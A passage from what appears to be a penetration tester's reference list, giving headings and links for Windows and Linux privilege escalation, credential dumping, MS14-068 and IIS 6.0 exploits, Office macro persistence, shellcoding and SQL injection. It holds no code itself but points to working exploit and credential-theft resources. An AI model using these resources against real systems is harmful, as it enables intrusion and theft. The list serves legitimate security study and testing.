  - [*https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/*](https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/)

<span id="anchor-479"></span>Old AccessChk.exe

  - [*https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe*](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)

<span id="anchor-480"></span>DLL Injection

  - [*http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1*](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1)

<span id="anchor-481"></span>MS14-068 (Pass-the-Credential Cache)

  - [*https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/*](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/)
  - [*https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/*](https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/)

<span id="anchor-482"></span>Dumping Credentials

  - [*https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/*](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)

<span id="anchor-483"></span>IIS 6.0 Exploit (CVE-2017-7269)

  - [*https://github.com/edwardz246003/IIS\_exploit/blob/master/exploit.py*](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py)
  - [*https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb*](https://github.com/zcgonvh/cve-2017-7269/blob/master/cve-2017-7269.rb)
  - [*https://www.exploit-db.com/exploits/41738/*](https://www.exploit-db.com/exploits/41738/)

<span id="anchor-484"></span>MimiPenguin

  - [*https://github.com/huntergregal/mimipenguin*](https://github.com/huntergregal/mimipenguin)

<span id="anchor-485"></span>HackSys Extreme Vulnerable Driver (HEVD)

  - [*https://github.com/hacksysteam/HackSysExtremeVulnerableDriver*](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)

<span id="anchor-486"></span>HackSysTeam-KernelPwn (@FuzzySec, uses
HEVD)

  - [*https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn*](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)

<span id="anchor-487"></span>Less Dirty Cow (Crontab)

  - [*https://github.com/securifera/cowcron*](https://github.com/securifera/cowcron)

<span id="anchor-488"></span>Shellcode Via JavaScript Via VBA (@subTee)

  - [*https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3\#file-example-js-L5-L6*](https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3#file-example-js-L5-L6)

<span id="anchor-489"></span>Office Add-In Persistence (@William\_Knows)

  - [*https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/*](https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)

<span id="anchor-490"></span>DLL Tricks with VBA to Improve Offensive
Macro Capability

  - [*https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/*](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)

<span id="anchor-491"></span>WePWNise - Office Template Persistence

  - [*https://github.com/mwrlabs/wePWNise*](https://github.com/mwrlabs/wePWNise)

<span id="anchor-492"></span>Sentinel DLL/EXE Path Hijacking Detection
Tool

  - [*https://skanthak.homepage.t-online.de/sentinel.html*](https://skanthak.homepage.t-online.de/sentinel.html)

<span id="anchor-493"></span>Converting Mimikatz to a DLL to Be Loaded
Reflectively

  - [*https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/*](https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/)

<span id="anchor-494"></span>Sandbox Breakouts (nodejs/javascript)

  - [*http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine*](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

<span id="anchor-495"></span>Shellcoding

<span id="anchor-496"></span>64-Bit Shellcoding Tutorial

  - [*http://mcdermottcybersecurity.com/articles/windows-x64-shellcode*](http://mcdermottcybersecurity.com/articles/windows-x64-shellcode)

<span id="anchor-497"></span>Portable Executable (PE) File Information

<span id="anchor-498"></span>An In-Depth Look into the Win32 Portable
Executable File Format

  - PDF files have been saved to Google Drive as they are no longer
    available from Microsoft.
    [*Part 1*](https://drive.google.com/open?id=12XHlJU8Art2PyfqpGcYF4K64IPIitXK6),
    [*Part 1
    Figures*](https://drive.google.com/open?id=1LZsLFq3MfLeeybbqmk6AM817bDjfng9r)
    &
    [*Part 2*](https://drive.google.com/open?id=1xCtTgPR67vYz1YhVQV9uv4bhyk_8hlmD),
    [*Part 2
    Figures*](https://drive.google.com/open?id=1IuKuF16oFUP5cKA6dm7BPLiYFp1jcRYK)

<span id="anchor-499"></span>SQL Injection

  - [*https://websec.ca/kb/sql\_injection*](https://websec.ca/kb/sql_injection)
  - [*https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/*](https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/)
  - [*https://portswigger.net/web-security/sql-injection/cheat-sheet*](https://portswigger.net/web-security/sql-injection/cheat-sheet)
  -
